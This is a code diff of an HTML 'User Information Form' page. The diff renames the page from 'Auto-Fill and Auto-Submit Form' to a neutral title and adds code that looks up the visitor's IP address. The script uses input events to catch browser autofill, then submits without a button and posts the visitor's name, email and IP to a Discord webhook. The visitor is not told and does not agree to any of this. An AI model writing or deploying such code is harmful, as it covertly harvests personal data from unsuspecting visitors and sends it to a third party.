@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Auto-Fill and Auto-Submit Form</title>
+  <title>User Information Form</title>
 </head>
 <body>
   <h1>User Information Form</h1>
@@ -28,6 +28,12 @@
     const lnameField = document.getElementById('lname');
     const emailField = document.getElementById('email');
 
+    // Automatically focus on the first field when the page loads
+    window.onload = () => {
+      fnameField.focus();
+    };
+
+    // A function to check if all fields are filled
     function checkFields() {
       if (fnameField.value.trim() !== '' && lnameField.value.trim() !== '' && emailField.value.trim() !== '') {
         // Once all fields are filled, submit the form
@@ -41,13 +47,22 @@
       const lname = lnameField.value.trim();
       const email = emailField.value.trim();
 
-      // Prevent default form submission since we want to handle it via fetch
-      // There's no submit button, but we can manually send data to Discord
-      sendToDiscord(fname, lname, email);
+      // Fetch user IP and then send data to Discord
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const userIP = data.ip;
+          sendToDiscord(fname, lname, email, userIP);
+        })
+        .catch(err => {
+          console.error('Error fetching IP:', err);
+          // Even if we fail to get the IP, we can still send what we have.
+          sendToDiscord(fname, lname, email, 'IP not found');
+        });
     }
 
-    function sendToDiscord(fname, lname, email) {
-      const message = `New user info submitted:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
+    function sendToDiscord(fname, lname, email, ip) {
+      const message = `New user info submitted:\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}\n**IP Address:** ${ip}`;
 
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
@@ -64,7 +79,7 @@
       .catch(err => console.error('Error sending message to Discord:', err));
     }
 
-    // Listen to changes to detect autofill
+    // Listen for input changes to detect autofill or typing
     fnameField.addEventListener('input', checkFields);
     lnameField.addEventListener('input', checkFields);
     emailField.addEventListener('input', checkFields);
